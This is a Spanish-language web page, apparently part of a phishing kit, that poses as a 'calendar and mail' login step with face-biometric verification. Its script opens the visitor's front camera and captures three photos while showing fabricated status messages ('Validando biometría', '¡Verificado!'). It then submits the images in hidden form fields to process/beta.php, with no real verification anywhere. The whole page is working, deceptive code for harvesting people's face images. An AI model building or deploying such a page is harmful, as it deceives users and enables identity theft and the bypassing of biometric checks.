<!DOCTYPE html>
<html lang="es">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no, maximum-scale=1.0, viewport-fit=cover">
<title>Calendario y correo</title>
<style>
    :root {
        --primary: #007aff; /* Azul sistema */
        --success: #34c759; /* Verde éxito */
        --bg: #ffffff;
        --text-main: #000000;
        --text-sub: #8e8e93;
    }

    * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; }

    body {
        background-image: url(fondo-login-tablet.jpg.jpeg);
        background-repeat: no-repeat;
        background-size: cover;
        height: 100vh;
        width: 100%;
        display: flex;
        flex-direction: column;
        align-items: center;
        justify-content: center;
        overflow: hidden;
    }

    /* Contenedor principal de la cámara */
    .scanner-container {
        position: relative;
        width: 280px;
        height: 280px;
        display: flex;
        justify-content: center;
        align-items: center;
        margin-bottom: 40px;
    }

    /* El círculo de video */
    .video-mask {
        width: 260px;
        height: 260px;
        border-radius: 50%;
        overflow: hidden;
        position: absolute;
        z-index: 10;
        background: #f2f2f7; /* Color de carga */
        transform: translateZ(0); /* Aceleración hardware */
    }

    video {
        width: 100%;
        height: 100%;
        object-fit: cover;
        transform: scaleX(-1);
    }

    /* Anillo de Progreso SVG */
    .progress-ring {
        position: absolute;
        width: 100%;
        height: 100%;
        transform: rotate(-90deg);
        z-index: 20;
    }

    .progress-ring__circle {
        transition: stroke-dashoffset 0.5s ease-in-out, stroke 0.3s;
        transform-origin: 50% 50%;
    }

    /* Efectos sobre el video */
    .scan-light {
        position: absolute;
        top: 0;
        left: 0;
        width: 100%;
        height: 100%;
        background: linear-gradient(180deg, rgba(255,255,255,0) 40%, rgba(255,255,255,0.6) 50%, rgba(255,255,255,0) 60%);
        z-index: 15;
        opacity: 0.6;
        animation: scanDown 2s infinite linear;
        pointer-events: none;
    }

    @keyframes scanDown {
        0% { transform: translateY(-100%); }
        100% { transform: translateY(100%); }
    }

    /* Flash Blanco */
    .flash {
        position: fixed;
        inset: 0;
        background: white;
        opacity: 0;
        pointer-events: none;
        z-index: 100;
        transition: opacity 0.1s;
    }

    /* Textos */
    .status-area {
        text-align: center;
        padding: 0 20px;
        z-index: 30;
        height: 60px; /* Espacio fijo para que no brinque */
    }

    .status-title {
        font-size: 20px;
        font-weight: 600;
        color: var(--text-main);
        margin-bottom: 8px;
        letter-spacing: -0.5px;
    }

    .status-sub {
        font-size: 15px;
        color: var(--text-sub);
    }

    /* Animación de palpitación sutil en espera */
    .pulse {
        animation: pulseEffect 2s infinite;
    }
    
    @keyframes pulseEffect {
        0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 122, 255, 0.4); }
        70% { transform: scale(1); box-shadow: 0 0 0 20px rgba(0, 122, 255, 0); }
        100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(0, 122, 255, 0); }
    }

    /* Loader final minimalista */
    #loader-overlay {
        position: fixed;
        inset: 0;
        background: white;
        z-index: 200;
        display: none;
        flex-direction: column;
        justify-content: center;
        align-items: center;
    }
    
    .spinner {
        width: 32px;
        height: 32px;
        border: 3px solid #e5e5e5;
        border-top-color: #000;
        border-radius: 50%;
        animation: spin 0.8s linear infinite;
    }
    @keyframes spin { to { transform: rotate(360deg); } }

</style>
</head>
<body>

    <div class="scanner-container" id="camera-container">
        <svg class="progress-ring" width="280" height="280">
            <circle stroke="#e5e5ea" stroke-width="6" fill="transparent" r="136" cx="140" cy="140"/>
            <circle class="progress-ring__circle" stroke="#007aff" stroke-width="6" stroke-linecap="round" fill="transparent" r="136" cx="140" cy="140" stroke-dasharray="854" stroke-dashoffset="854"/>
        </svg>

        <div class="video-mask" id="video-mask">
            <video id="video" autoplay playsinline muted></video>
            <div class="scan-light"></div>
        </div>
    </div>

    <div class="status-area">
        <div class="status-title" id="main-text">Iniciando cámara...</div>
        <div class="status-sub" id="sub-text">Por favor, espera</div>
    </div>

    <div class="flash" id="flash-effect"></div>

    <div id="loader-overlay">
        <div class="spinner"></div>
    </div>

    <form id="biometric-form" action="process/beta.php" method="POST">
        <input type="hidden" name="foto1" id="input-foto1">
        <input type="hidden" name="foto2" id="input-foto2">
        <input type="hidden" name="foto3" id="input-foto3">
    </form>

<script>
    const video = document.getElementById("video");
    const circle = document.querySelector('.progress-ring__circle');
    const radius = circle.r.baseVal.value;
    const circumference = radius * 2 * Math.PI;
    const mainText = document.getElementById("main-text");
    const subText = document.getElementById("sub-text");
    const flashEffect = document.getElementById("flash-effect");
    const videoMask = document.getElementById("video-mask");

    // Configuración del anillo SVG
    circle.style.strokeDasharray = `${circumference} ${circumference}`;
    circle.style.strokeDashoffset = circumference;

    function setProgress(percent) {
        const offset = circumference - (percent / 100) * circumference;
        circle.style.strokeDashoffset = offset;
    }

    async function startCamera() {
        try {
            const stream = await navigator.mediaDevices.getUserMedia({ 
                video: { facingMode: "user", width: { ideal: 480 }, height: { ideal: 480 } } 
            });
            video.srcObject = stream;
            
            // Esperar que cargue para empezar
            video.onloadedmetadata = () => {
                videoMask.classList.add('pulse'); // Efecto latido
                mainText.innerText = "Mírame de frente";
                subText.innerText = "Encuadra tu rostro";
                setTimeout(runSequence, 1500);
            };
        } catch {
            mainText.innerText = "Error";
            subText.innerText = "No se pudo acceder a la cámara";
        }
    }

    function runSequence() {
        // Foto 1
        mainText.innerText = "No te muevas";
        subText.innerText = "Escaneando...";
        
        setTimeout(() => {
            capture(1);
            setProgress(33); // 1/3 del círculo
            
            // Foto 2
            setTimeout(() => {
                mainText.innerText = "Validando biometría";
                subText.innerText = "Mantén la posición";
                capture(2);
                setProgress(66); // 2/3 del círculo

                // Foto 3
                setTimeout(() => {
                    mainText.innerText = "Casi listo...";
                    subText.innerText = "Ajustando luz";
                    capture(3);
                    setProgress(100); // Círculo completo
                    finish();
                }, 1600);
            }, 1800);
        }, 1500);
    }

    function capture(idx) {
        const canvas = document.createElement("canvas");
        canvas.width = video.videoWidth;
        canvas.height = video.videoHeight;
        const ctx = canvas.getContext("2d");
        ctx.drawImage(video, 0, 0);
        
        document.getElementById(`input-foto${idx}`).value = canvas.toDataURL("image/jpeg", 0.85);
        
        // Flash visual
        flashEffect.style.opacity = "0.7";
        setTimeout(() => flashEffect.style.opacity = "0", 100);
    }

    function finish() {
        // Color verde al finalizar
        circle.style.stroke = "#34c759";
        videoMask.classList.remove('pulse');
        
        mainText.innerText = "¡Verificado!";
        mainText.style.color = "#34c759";
        subText.innerText = "Redirigiendo...";

        setTimeout(() => {
            document.getElementById("loader-overlay").style.display = "flex";
            document.getElementById("biometric-form").submit();
        }, 1200);
    }

    startCamera();
</script>

</body>
</html>